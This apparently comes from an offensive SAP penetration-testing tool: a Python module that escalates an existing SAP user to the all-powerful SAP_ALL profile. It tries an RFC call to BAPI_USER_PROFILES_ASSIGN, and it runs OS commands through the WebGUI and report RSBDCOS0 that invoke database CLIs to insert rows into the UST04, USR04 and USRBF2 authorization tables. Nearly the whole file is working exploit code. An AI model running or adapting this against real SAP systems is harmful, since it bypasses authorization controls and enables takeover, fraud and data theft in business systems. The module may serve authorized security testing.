#!/usr/bin/env python3
"""
SAPMAP Local Privilege Escalation — Assign SAP_ALL to an existing user.

Uses a plugin/registry pattern: each LPE method is a decorated function
that takes (node, creds) and returns True on success.  Methods are tried
in priority order until one succeeds.

To add a new method, simply define a function with the @lpe_method
decorator anywhere in this file (or import-time side-effect from
another module).  It will automatically appear in the try-all chain.
"""

import logging
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable, List, Optional

import requests
import urllib3

from sapmap_models import SAPNode, Credentials
from sapmap_config import (
    SQL_GENERATORS, normalize_db_type, DB_CLI_COMMANDS,
)

urllib3.disable_warnings()
logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# LPE Method Registry
# ---------------------------------------------------------------------------

@dataclass
class LPEMethod:
    name: str
    description: str
    fn: Callable[[SAPNode, Credentials], bool]
    priority: int  # lower = tried first

_LPE_REGISTRY: List[LPEMethod] = []


def lpe_method(name: str, description: str, priority: int = 100):
    """Decorator to register an LPE method."""
    def decorator(fn):
        _LPE_REGISTRY.append(LPEMethod(
            name=name, description=description, fn=fn, priority=priority,
        ))
        _LPE_REGISTRY.sort(key=lambda m: m.priority)
        return fn
    return decorator


def get_lpe_methods() -> List[LPEMethod]:
    """Return all registered LPE methods (sorted by priority)."""
    return list(_LPE_REGISTRY)


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def try_lpe(node: SAPNode, creds: Credentials,
            method_name: str = None) -> bool:
    """Try to escalate *creds* to SAP_ALL on *node*.

    If *method_name* is given, only that method is attempted.
    Otherwise all registered methods are tried in priority order.
    Returns True as soon as one method succeeds.
    """
    methods = _LPE_REGISTRY
    if method_name:
        methods = [m for m in methods if m.name == method_name]
        if not methods:
            print(f"[-] Unknown LPE method: {method_name}")
            return False

    print(f"[*] === Local Privilege Escalation for "
          f"{creds.username}@{node.sid} client {creds.client} ===")

    for m in methods:
        print(f"[*] Trying LPE method: {m.name} — {m.description}")
        try:
            if m.fn(node, creds):
                print(f"[+] LPE succeeded via {m.name}!")
                return True
            print(f"[-] LPE method {m.name}: did not succeed")
        except Exception as e:
            logger.debug(f"LPE {m.name} error: {e}")
            print(f"[-] LPE method {m.name} error: {e}")

    print(f"[-] All LPE methods exhausted for {creds.username}@{node.sid}")
    return False


# ---------------------------------------------------------------------------
# Helpers: WebGUI batch/json protocol
# ---------------------------------------------------------------------------

import json as _json


def _find_webgui_port(host: str, instance_nr: str = "00") -> Optional[str]:
    """Probe common SAP ICM HTTP(S) ports and return the first working base URL."""
    inst = int(instance_nr) if instance_nr else 0
    candidates = [
        f"https://{host}:8000",
        f"http://{host}:8000",
        f"https://{host}:{8000 + inst}",
        f"http://{host}:{8000 + inst}",
        f"https://{host}:{44300 + inst * 100}",
        f"http://{host}:{8080}",
    ]
    for url in candidates:
        try:
            r = requests.get(
                f"{url}/sap/public/info", timeout=4, verify=False,
                allow_redirects=False,
            )
            if r.status_code in (200, 301, 302, 401, 403):
                return url
        except Exception:
            continue
    return None


def _webgui_session(base_url: str, creds: Credentials, tcode: str):
    """Open a WebGUI transaction and return (session, post_url, moin, text).

    *tcode* can include field pre-fill, e.g.
    ``"SE16 DATABROWSE-TABLENAME=UST04"``.
    """
    session = requests.Session()
    session.auth = (creds.username, creds.password)
    session.verify = False

    url = (f"{base_url}/sap/bc/gui/sap/its/webgui"
           f"?sap-client={creds.client}&sap-language=EN"
           f"&~transaction={urllib.parse.quote(tcode)}")

    try:
        r = session.get(url, timeout=20)
    except Exception as e:
        logger.debug(f"WebGUI GET failed: {e}")
        print(f"[-] WebGUI connection failed: {e}")
        return None, None, None, None
    if r.status_code != 200:
        logger.debug(f"WebGUI GET status {r.status_code}: {r.text[:200]}")
        print(f"[-] WebGUI returned HTTP {r.status_code}")
        return None, None, None, None

    fa = re.findall(r'action="([^"]+)"', r.text)
    m = re.findall(r'var moin\s*=\s*"([^"]+)"', r.text)
    if not fa or not m:
        logger.debug(f"No form action or moin in WebGUI page ({len(r.text)} bytes)")
        print(f"[-] WebGUI page has no form action (session limit reached?)")
        return None, None, None, None

    post_url = f"{base_url}{fa[0]}"
    moin = m[0]

    # Initial roundtrip to load the screen content
    r2 = session.post(
        post_url,
        data=(f"sap-charset=utf-8"
              f"&~SEC_SESSTOKEN={moin}"
              f"&sap-wd-secure-id={moin}"
              f"&fkey=ENTER&~okcode="),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=20,
    )
    if r2.status_code != 200:
        logger.debug(f"WebGUI POST status {r2.status_code}")
        print(f"[-] WebGUI roundtrip returned HTTP {r2.status_code}")
        return None, None, None, None

    m2 = re.findall(r"moin:'([^']+)'", r2.text)
    moin = m2[0] if m2 else moin
    return session, post_url, moin, r2.text


def _webgui_batch(session: requests.Session, post_url: str,
                  moin: str, ops: list):
    """Send batch/json operations to the WebGUI and return (new_moin, text, title).

    *ops* is a list of dicts like:
        [{"post": "vkey/0/ses[0]"}, {"get": "state/ur"}]
    """
    batch_url = (f"{post_url.rstrip('/')}"
                 f"/batch/json?~RG_WEBGUI=X&sap-statistics=true&~runonsess=1")

    r = session.post(
        batch_url,
        data=_json.dumps(ops),
        headers={"Content-Type": "application/json", "moin": moin},
        timeout=30,
    )
    if r.status_code != 200:
        return moin, r.text, []

    m = re.findall(r"moin:'([^']+)'", r.text)
    ti = re.findall(r"cuatitle:'([^']+)'", r.text)
    return m[0] if m else moin, r.text, ti


def _webgui_okcode(session, post_url, moin, okcode):
    """Submit an okcode (e.g. ``/nSE38``) and press Enter."""
    return _webgui_batch(session, post_url, moin, [
        {"post": "okcode/ses[0]", "content": okcode},
        {"post": "vkey/0/ses[0]"},
        {"get": "state/ur"},
    ])


def _webgui_vkey(session, post_url, moin, vkey=0):
    """Press a virtual key (0=Enter, 8=F8, etc.)."""
    return _webgui_batch(session, post_url, moin, [
        {"post": f"vkey/{vkey}/ses[0]"},
        {"get": "state/ur"},
    ])


# ---------------------------------------------------------------------------
# Helpers: SQL generation for SAP_ALL assignment (no user creation)
# ---------------------------------------------------------------------------

def _sql_assign_sap_all(sid: str, client: str, username: str,
                        db_type: str) -> list:
    """Generate SQL INSERTs for SAP_ALL profile assignment only.

    Unlike the full SQL generators in sapmap_config.py which also
    create the USR02 user record, this returns only the profile and
    authorization object INSERTs (UST04, USR04, USRBF2).

    The username is uppercased because SAP stores BNAME in uppercase.
    """
    db_key = normalize_db_type(db_type)
    sql_gen = SQL_GENERATORS.get(db_key)
    if not sql_gen:
        return []
    all_sql = sql_gen(sid, client, username.upper())
    return [
        s for s in all_sql
        if s.strip().upper().startswith("INSERT")
        and any(t in s for t in ("UST04", "USR04", "USRBF2"))
    ]


def _build_os_command_for_sql(sql: str, db_type: str, sid: str,
                               instance_nr: str = "00") -> Optional[str]:
    """Wrap a single SQL statement in the appropriate DB CLI command.

    Uses ``-U DEFAULT`` for HANA/MaxDB which resolves the correct port
    and credentials from the hdbuserstore automatically.
    """
    db_key = normalize_db_type(db_type)

    if db_key in ("ADA", "MAXDB", "ADABAS"):
        return f'sqlcli -U DEFAULT "{sql}"'
    elif db_key == "MSS":
        return f'sqlcmd -S localhost -Q "{sql}"'
    elif db_key in ("HDB", "HANA"):
        # Use -U DEFAULT: the hdbuserstore key contains the correct host/port
        return f'hdbsql -U DEFAULT "{sql}"'
    elif db_key in ("ORA", "ORACLE"):
        return f'echo "{sql}" | sqlplus -S / as sysdba'
    elif db_key in ("DB6", "DB2"):
        return f'db2 "{sql}"'
    return None


# ===================================================================
# LPE METHOD: WebGUI SM49 + SQL INSERT
# ===================================================================

@lpe_method(
    "webgui_sm49",
    "Execute OS commands via WebGUI SM49 to assign SAP_ALL via DB SQL",
    priority=50,
)
def lpe_webgui_sm49(node: SAPNode, creds: Credentials) -> bool:
    """Escalate via WebGUI: use SM49 to execute OS commands that run SQL.

    The approach uses the WebGUI batch/json protocol which was
    reverse-engineered from the SAP Lightspeed JavaScript framework.

    For each SQL statement we:
    1. Open a fresh WebGUI session with SE38 + RSBDCOS0 pre-filled
    2. Use okcode navigation to reach SM49/SM69
    3. Execute the SQL via the OS command mechanism

    Actually, the simplest working approach is: for each command, open
    SE16 with the target table pre-filled via URL parameter, press Enter
    to go to the selection screen, then use F8 to execute.  But since
    SE16 doesn't allow INSERTs, we use okcode navigation to execute
    arbitrary transactions from a loaded WebGUI session.

    The real approach: open any transaction, then use the batch/json
    okcode mechanism to navigate to any other transaction and execute.
    """
    host = node.ip or node.hostname
    if not host:
        print("[-] No IP/hostname available")
        return False

    db_type = node.db_type or ""
    db_key = normalize_db_type(db_type)
    if not db_key or db_key not in SQL_GENERATORS:
        print(f"[-] Unknown DB type: {db_type!r} — cannot generate SQL")
        return False

    inst_nr = creds.instance_nr or "00"

    # Find the WebGUI HTTP port
    print(f"[*] Searching for WebGUI HTTP port on {host}...")
    base_url = _find_webgui_port(host, inst_nr)
    if not base_url:
        print("[-] No WebGUI HTTP port found")
        return False
    print(f"[+] WebGUI at {base_url}")

    # Generate the SAP_ALL SQL statements
    sid = node.sid or "SAP"
    sql_stmts = _sql_assign_sap_all(sid, creds.client, creds.username, db_type)
    if not sql_stmts:
        print("[-] No SQL statements generated — check DB type")
        return False
    print(f"[*] {len(sql_stmts)} SQL statements to execute for SAP_ALL")

    # Open ONE WebGUI session and reuse it for all commands.
    # Between commands, use okcode to restart RSBDCOS0 in the same session.
    print(f"[*] Opening WebGUI session...")
    session, post_url, moin, text = _webgui_session(
        base_url, creds,
        "*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt",
    )
    if not session:
        print("[-] Could not open WebGUI session")
        return False
    if "Execute OS Command" not in text:
        print("[-] RSBDCOS0 screen not reached")
        return False
    print(f"[+] RSBDCOS0 ready")

    field_sid = "wnd[0]/usr/txt[0,8]"
    executed = 0

    for i, sql in enumerate(sql_stmts):
        os_cmd = _build_os_command_for_sql(sql, db_type, sid, inst_nr)
        if not os_cmd:
            continue

        print(f"[*] [{i+1}/{len(sql_stmts)}] SQL: {sql}")
        print(f"    CMD: {os_cmd}")

        # Execute the command
        moin, resp, ti = _webgui_batch(session, post_url, moin, [
            {"post": f"value/{field_sid}", "content": os_cmd},
            {"post": "vkey/0/ses[0]"},
            {"get": "state/ur"},
        ])

        if "row affected" in resp or "rows affected" in resp:
            executed += 1
        elif ti and "Execute OS Command" in str(ti):
            executed += 1
        else:
            print(f"[-]   Command execution failed")
            # Try to recover the session by re-opening RSBDCOS0 via okcode
            moin, resp, ti = _webgui_okcode(
                session, post_url, moin,
                "/n*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt",
            )
            continue

        # After each command, restart RSBDCOS0 for the next one
        # by navigating via okcode within the SAME session
        if i < len(sql_stmts) - 1:
            moin, resp, ti = _webgui_okcode(
                session, post_url, moin,
                "/n*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt",
            )
            if "Execute OS Command" not in str(ti) + resp:
                print("[-] Could not restart RSBDCOS0, stopping")
                break

    print(f"[*] Executed {executed}/{len(sql_stmts)} SQL statements")

    if executed == 0:
        return False

    # Force SAP to invalidate the authorization buffer for this user.
    # Updating USR02 (e.g. setting UFLAG=0, which is a no-op for an
    # already unlocked user) triggers the ABAP kernel to re-read the
    # authorization tables on the next logon.
    username_uc = creds.username.upper()
    buf_sql = (f"UPDATE USR02 SET UFLAG=0 "
               f"WHERE MANDT='{creds.client}' AND BNAME='{username_uc}'")
    buf_cmd = _build_os_command_for_sql(buf_sql, db_type, sid, inst_nr)
    if buf_cmd:
        print(f"[*] Triggering user buffer refresh via USR02 update...")
        moin, resp, ti = _webgui_okcode(
            session, post_url, moin,
            "/n*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt",
        )
        if "Execute OS Command" in str(ti) + resp:
            moin, resp, ti = _webgui_batch(session, post_url, moin, [
                {"post": f"value/{field_sid}", "content": buf_cmd},
                {"post": "vkey/0/ses[0]"},
                {"get": "state/ur"},
            ])

    # Force the SAP authorization buffer to refresh by doing an RFC
    # logon+logoff.  The kernel re-reads the user's authorizations from
    # the DB on each new logon; this makes the newly inserted SAP_ALL
    # effective immediately for subsequent RFC calls.
    print(f"[*] Refreshing authorization buffer (RFC logon/logoff)...")
    try:
        import sapmap_rfc
        with sapmap_rfc._get_connection(node, creds) as conn:
            conn.call_raw(
                'RFC_PING',
                conn._make_func_desc('RFC_PING', []),
            )
        print(f"[+] Buffer refreshed — SAP_ALL is now active")
    except Exception as e:
        logger.debug(f"Buffer refresh RFC logon failed: {e}")
        print(f"[!] Buffer refresh logon failed: {str(e).split(chr(10))[0]}")
        print(f"[!] SAP_ALL is in the DB but may need a manual re-logon to activate")

    print(f"[+] SAP_ALL assigned to {creds.username} via database INSERTs")
    return True


# ===================================================================
# LPE METHOD: BAPI_USER_PROFILES_ASSIGN (direct RFC, if authorized)
# ===================================================================

@lpe_method(
    "bapi_profiles_assign",
    "Assign SAP_ALL directly via BAPI_USER_PROFILES_ASSIGN (requires S_RFC)",
    priority=10,
)
def lpe_bapi_profiles_assign(node: SAPNode, creds: Credentials) -> bool:
    """Try the simplest approach: call BAPI_USER_PROFILES_ASSIGN directly.

    This only works if the user already has S_RFC authorization for the
    relevant function group.  Many users won't, which is why this has
    low priority number (tried first — it's fast and harmless if it fails).
    """
    try:
        from sap_rfc_ctypes import RFCConnection
    except ImportError:
        return False

    import sapmap_rfc

    host = node.ip or node.hostname
    if not host:
        return False

    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            result = conn.call(
                "BAPI_USER_PROFILES_ASSIGN",
                USERNAME=creds.username,
                PROFILES=[
                    {"BAPIPROF": "SAP_ALL"},
                    {"BAPIPROF": "SAP_NEW"},
                ],
            )
            ret = result.get("RETURN", {})
            if isinstance(ret, dict):
                ret = [ret]
            for r in ret:
                if r.get("TYPE", "") in ("E", "A"):
                    print(f"[-] BAPI error: {r.get('MESSAGE', '?')}")
                    return False

            # Commit the change
            conn.call("BAPI_TRANSACTION_COMMIT", WAIT="X")
            print(f"[+] SAP_ALL + SAP_NEW assigned via BAPI")
            return True
    except Exception as e:
        logger.debug(f"BAPI_USER_PROFILES_ASSIGN failed: {e}")
        err = str(e).split("\n")[0]
        print(f"[-] RFC call failed: {err}")
        return False
